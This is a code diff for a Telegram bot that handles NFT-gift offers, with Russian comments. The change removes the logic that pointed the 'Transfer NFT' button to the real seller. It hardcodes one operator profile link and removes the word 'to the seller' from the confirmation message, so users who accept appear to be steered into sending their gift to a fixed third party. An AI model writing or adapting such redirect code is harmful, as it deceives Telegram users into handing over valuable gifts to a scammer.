@@ -26,18 +26,10 @@ async def create_offer(message: types.Message):
 
     nft_link, price, currency, lang = match.groups()
     
-    # Определяем, кто написал команду (его юзернейм)
-    seller_username = message.from_user.username
-    if seller_username:
-        seller_link = f"https://t.me/{seller_username}"
-    else:
-        # Если у человека нет юзернейма, используем его ID
-        seller_link = f"tg://user?id={message.from_user.id}"
-
-    # Передаем ссылку в кнопку "Принять"
+    # Кнопки для оффера (Принять/Отклонить)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept_{seller_link}"),
+            InlineKeyboardButton(text="✅ Принять", callback_data="accept_offer"),
             InlineKeyboardButton(text="❌ Отклонить", callback_data="decline_offer")
         ]
     ])
@@ -56,19 +48,19 @@ async def create_offer(message: types.Message):
         business_connection_id=message.business_connection_id
     )
 
-# Обработка кнопки "Принять" (достаем ссылку продавца)
-@dp.callback_query(F.data.startswith("accept_"))
+# Обработка кнопки "Принять"
+@dp.callback_query(F.data == "accept_offer")
 async def process_accept(callback: CallbackQuery):
-    # Достаем ссылку из данных кнопки
-    seller_link = callback.data.split("_", 1)[1]
+    # ТУТ ВАША ССЫЛКА
+    MY_PROFILE_LINK = "https://t.me/tamerlan111" 
 
     transfer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🎁 Передать NFT", url=seller_link)]
+        [InlineKeyboardButton(text="🎁 Передать NFT", url=MY_PROFILE_LINK)]
     ])
 
     await callback.answer("Оффер принят!")
     
-    text = "Сделка подтверждена. Передайте подарок продавцу по кнопке ниже."
+    text = "Сделка подтверждена. Передайте подарок по кнопке ниже."
     
     try:
         await bot.send_message(
